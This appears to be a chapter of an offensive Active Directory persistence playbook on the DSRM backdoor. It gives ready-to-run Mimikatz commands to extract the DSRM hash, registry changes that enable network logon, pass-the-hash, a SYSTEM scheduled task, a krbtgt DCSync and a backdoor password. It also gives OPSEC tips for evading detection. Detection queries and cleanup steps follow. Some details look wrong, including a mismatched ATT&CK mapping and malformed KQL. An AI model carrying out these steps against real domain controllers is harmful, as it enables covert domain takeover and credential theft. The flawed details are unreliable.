# DSRM Backdoor

## Overview

**Directory Services Restore Mode (DSRM)** is a special local administrator account on each Domain Controller. It was designed for recovering AD databases in disaster scenarios. The DSRM password is set when the DC is promoted and is rarely changed afterward.

The DSRM account is effectively the **local Administrator** on the Domain Controller. By extracting the DSRM hash and enabling logon behavior, an attacker can authenticate to a DC as the local Administrator **even after the domain admin password has changed**.

**Key Advantage:** The DSRM password is separate from the domain `Administrator` password. Changing domain admin passwords does **not** affect the DSRM backdoor.

---

## Prerequisites

- **Domain Admin** or local admin on the Domain Controller
- **DSRM password hash** (extracted from SAM or LSASS)
- Ability to modify registry on the DC
- Tools: Mimikatz (`token::elevate`, `lsadump::sam`, `lsadump::lsa`)

---

## Step 1: Extract the DSRM Hash

### Using Mimikatz (from SAM — requires SYSTEM privileges)

```cmd
mimikatz.exe privilege::debug
token::elevate
lsadump::sam
```

The DSRM account's hash appears under the local `Administrator` account in the SAM output:

```
RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : ntlmhash_here
```

### Using Mimikatz (from LSASS — requires Domain Admin)

```cmd
mimikatz.exe privilege::debug
lsadump::lsa /patch
```

You can also use DCSync to retrieve the DSRM hash from the DC:

```cmd
lsadump::dcsync /domain:targetdomain.local /user:DC01\Administrator
```

> **Note:** The DSRM account is a local account, so the `/user` parameter references the local machine context, not the domain.

---

## Step 2: Enable DSRM Logon Permission

By default, the DSRM account can **only** log on interactively at the console or via Remote Desktop. To use it for network authentication (Pass-the-Hash, Over-Pass-the-Hash), the `DsrmAdminLogonBehavior` registry key must be set.

### Set Registry Key to Allow Network Logon (DWORD = 2)

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force
```

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

### DsrmAdminLogonBehavior Values

| Value | Behavior |
|-------|----------|
| 0 | DSRM logon is not allowed (default if key does not exist) |
| 1 | DSRM logon allowed only via console/RDP |
| **2** | DSRM logon allowed via network (Pass-the-Hash, WMI, etc.) |

> A **reboot is required** for this change to take effect.

---

## Step 3: Use the DSRM Backdoor

### Pass-the-Hash with DSRM Hash

```cmd
mimikatz.exe privilege::debug
sekurlsa::pth /user:Administrator /domain:DC01 /ntlm:dsrm_ntlm_hash /run:cmd.exe
```

Now in the new `cmd.exe` process, you can authenticate as the **local** Administrator of the DC:

```cmd
dir \\DC01\C$
```

But note: **the DSRM account is the local admin, not a domain admin.** You cannot natively authenticate to other domain resources with this hash. However, local admin on a DC provides full domain admin equivalence since you can DCSync from it.

### Over-Pass-the-Hash (using NTLM to request a TGT)

```cmd
sekurlsa::pth /user:Administrator /domain:DC01 /ntlm:dsrm_ntlm_hash /run:powershell.exe
```

Inside the new shell:

```powershell
# Request a TGT (this will generate event 4768 on the DC)
klist purge
# The following uses the implicit credentials to get a TGT
net use \\DC01\IPC$ /user:DC01\Administrator
```

### Schedule Task (run as SYSTEM via DSRM)

```powershell
schtasks /create /S DC01 /SC ONLOGON /TN "DSRMBackdoor" /TR "powershell.exe -Command ..." /RU "NT AUTHORITY\SYSTEM"
```

### DCSync with DSRM Hash

With local admin on the DC, you can dump domain credentials:

```cmd
mimikatz.exe privilege::debug
lsadump::dcsync /domain:targetdomain.local /user:krbtgt /authuser:DC01\Administrator /authntlm:dsrm_ntlm_hash
```

---

## Step 4: Maintain Persistence

### Ensure the Registry Key Survives

The `DsrmAdminLogonBehavior` key persists across reboots. Verify:

```powershell
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior"
```

### Change DSRM Password (optional — set your own)

```powershell
# Requires ntdsutil
ntdsutil
set dsrm password
reset password on server DC01.targetdomain.local
P@ssw0rd_Backdoor!
P@ssw0rd_Backdoor!
q
q
```

Alternatively, use `net user` from the console of the DC in DSRM boot mode:

```cmd
net user administrator P@ssw0rd_Backdoor! /active:yes
```

> **Warning:** Changing the DSRM password is more likely to be noticed than leaving the original hash intact.

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **Registry Key** | Adding `DsrmAdminLogonBehavior` is a visible change. Use value `2` carefully. |
| **Reboot Required** | The key only takes effect after reboot — this may be a high-visibility change. |
| **Hash Extraction** | `lsadump::sam` and `lsadump::dcsync` generate event 4662 (SAM access / directory service access). Use `lsadump::lsa /patch` which is quieter. |
| **Logon Type** | Using DSRM for network logon generates event 4624 with `LogonType=3` and `TargetUserSid` containing the local Administrator SID (not domain). |
| **DSRM Account Monitoring** | Some organizations monitor for local Administrator logons on DCs. |
| **Password Changes** | If the DSRM password was reset, any old hashes are invalidated. Always extract the **current** DSRM hash. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **4657** | A registry value was modified (`DsrmAdminLogonBehavior`) | DC Security Log |
| **4624** | Logon by local Administrator account on a DC | DC Security Log |
| **4672** | Special privileges assigned to new logon (SeBackupPrivilege, SeDebugPrivilege on DSRM logon) | DC Security Log |
| **4776** | Credential validation by the computer account (local auth) | DC Security Log |
| **4662** | DCSync operation (if used to extract DSRM hash) | DC Security Log |

### Detection Indicators

1. **Local Administrator logon on a Domain Controller** — DCs should almost never have interactive or network logons using the local Administrator account
2. **Registry change to `DsrmAdminLogonBehavior`** — This is a major red flag
3. **Event 4624 with `TargetUserSid` matching `S-1-5-21-*-\*-500`** (local Administrator, not domain)
4. **Pass-the-Hash traffic** (NTLM authentication for local Administrator from a remote machine)

### Detection Queries

**KQL — Detect DSRM Logons:**

```
SecurityEvent
| where EventID == 4624
| where Account == "Administrator"
| where Computer != "DC01"  -- logon event appears on the DC
| where TargetDomainName != "DOMAIN"  -- not a domain logon
```

**KQL — Detect DsrmAdminLogonBehavior registry change:**

```
SecurityEvent
| where EventID == 4657
| where ObjectName contains "DsrmAdminLogonBehavior"
```

### Hunting

Look for any machine in the "Domain Controllers" OU where:
- Event 4624 shows `TargetUserSid` starting with `S-1-5-21-` that does **not** match the domain SID (i.e., it's the local machine SID)
- Registry modification events for `Lsa` key

---

## Cleanup / Reversal

### Reset DSRM Password

```powershell
# Open ntdsutil
ntdsutil
set dsrm password
reset password on server DC01.targetdomain.local
q
q
```

Or reset it to a new strong password and document it.

### Remove Registry Key

```powershell
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Force
```

```cmd
reg delete HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /f
```

### Verify Removal

```powershell
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue
```

### Post-Cleanup

- Restart the DC (required for DsrmAdminLogonBehavior changes to take effect)
- Verify no unauthorized scheduled tasks or services using the DSRM account
- Check for additional backdoors (SSP, Skeleton Key, etc.)
- Monitor for any future local admin logons on DCs

---

## References

- [Sean Metcalf — DSRM Backdoor](https://adsecurity.org/?p=1714)
- [Mimikatz DSRM Usage](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [MS Docs — DSRM Logon Behavior](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-ds-recovery-account)
- MITRE ATT&CK: T1556.002 (Modify Authentication Process: Password Filter DLL)
- MITRE ATT&CK: T1078.003 (Valid Accounts: Local Accounts)

---

**Next:** [04 - Skeleton Key](04_Skeleton_Key.md)
